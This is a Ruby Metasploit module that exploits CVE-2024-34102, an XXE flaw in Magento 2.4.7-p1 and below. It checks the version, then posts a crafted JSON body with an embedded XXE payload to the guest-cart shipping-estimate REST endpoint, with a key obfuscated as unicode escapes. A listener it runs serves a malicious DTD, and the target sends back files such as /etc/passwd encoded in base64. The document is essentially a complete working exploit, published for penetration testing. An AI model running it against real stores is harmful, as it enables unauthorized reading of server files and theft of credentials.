##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Magento XXE Unserialize Arbitrary File Read',
        'Description' => %q{
          This module exploits a XXE vulnerability in Magento 2.4.7-p1 and below which allows an attacker to read any file on the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sergey Temnikov',  # Vulnerability discovery
          'Heyder',           # Metasploit module
        ],

        'References' => [
          ['CVE', '2024-34102'],
          ['URL', 'https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md']
        ],
        'DisclosureDate' => '2024-06-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
      )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to the web application', '/']),
        OptString.new('TARGETFILE', [ true, 'The target file to read', '/etc/passwd']),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false])
      ]
    )
  end

  def check
    vprint_status('Trying to get the Magento version')

    # request to check if the target is vulnerable /magento_version
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/magento_version')
    })

    return CheckCode::Unknown('Could not detect the version.') unless res&.code == 200

    # Magento/2.4 (Community)
    version, edition = res.body.scan(%r{Magento/([\d.]+) \(([^)]+)\)}).first

    version = Rex::Version.new(version)

    return CheckCode::Safe("Detected Magento #{edition} edition version #{version} which is not vulnerable") unless
      version <= (Rex::Version.new('2.4.7')) ||
      version <= (Rex::Version.new('2.4.6-p5')) ||
      version <= (Rex::Version.new('2.4.5-p7')) ||
      version <= (Rex::Version.new('2.4.4-p8')) ||
      (
        edition == 'Enterprise' && (
          version <= (Rex::Version.new('2.4.3-ext-7')) ||
          version <= (Rex::Version.new('2.4.2-ext-7'))
        )
      )

    CheckCode::Appears("Detected Magento #{edition} edition version #{version} which is vulnerable")
  end

  def ent_eval
    @ent_eval ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def leak_param_name
    @leak_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def dtd_param_name
    @dtd_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def make_xxe_dtd
    filter_path = "php://filter/convert.base64-encode/resource=#{datastore['TARGETFILE']}"
    ent_file = Rex::Text.rand_text_alpha_lower(4..8)
    %(
      <!ENTITY % #{ent_file} SYSTEM "#{filter_path}">
      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/?#{leak_param_name}=%#{ent_file};'>">
    )
  end

  def xxe_xml_data
    param_entity_name = Rex::Text.rand_text_alpha_lower(4..8)

    xml = "<?xml version='1.0' ?>"
    xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
    xml += '['
    xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
    xml += "    <!ENTITY % #{param_entity_name} SYSTEM 'http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
    xml += ']'
    xml += "> <r>&#{ent_eval};</r>"

    xml
  end

  def xxe_request
    vprint_status('Sending XXE request')

    signature = Rex::Text.rand_text_alpha(6).capitalize

    post_data = <<~EOF
      {
        "address": {
        "#{signature}": "#{Rex::Text.rand_text_alpha_lower(4..8)}",
        "totalsCollector": {
          "collectorList": {
          "totalCollector": {
            "\u0073\u006F\u0075\u0072\u0063\u0065\u0044\u0061\u0074\u0061": {
            "data": "#{xxe_xml_data}",
            "options": 12345678
            }
          }
          }
        }
        }
      }
    EOF

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/rest/V1/guest-carts/1/estimate-shipping-methods'),
      'ctype' => 'application/json',
      'data' => post_data
    })

    fail_with(Failure::UnexpectedReply, "Server returned unexpected response: #{res.code}") unless res&.code == 400

    body = res.get_json_document

    fail_with(Failure::UnexpectedReply, 'Server might not be vulnerable') unless body['parameters']['fieldName'] == signature
  end

  def run
    if datastore['SRVHOST'] == '0.0.0.0' || datastore['SRVHOST'] == '::'
      fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful')
    end

    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_request_uri(cli, req)
        end,
        'Path' => '/'
      },
      'ssl' => false
    })

    xxe_request
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  end

  def on_request_uri(cli, req)
    super
    data = ''

    case req.uri
    when /(.*).dtd/
      vprint_status("Received request for DTD file from #{cli.peerhost}")
      data = make_xxe_dtd
    when /#{leak_param_name}/
      data = req.uri_parts['QueryString'].values.first.gsub(/\s/, '+')
      if data&.empty?
        print_error('No data received')
      else

        file_name = datastore['TARGETFILE']
        file_data = ::Base64.decode64(data).force_encoding('UTF-8')

        if datastore['STORE_LOOT']
          p = store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'Magento XXE CVE-2024-34102 Results')
          print_good("File saved in: #{p}")
        else
          # A new line is sent before file contents for better readability
          print_good("File read succeeded! \n#{file_data}")
        end

      end
    else
      print_status("Unexpected request received: '#{req.method} #{req.uri}'")
    end

    send_response(cli, data)
  end

end
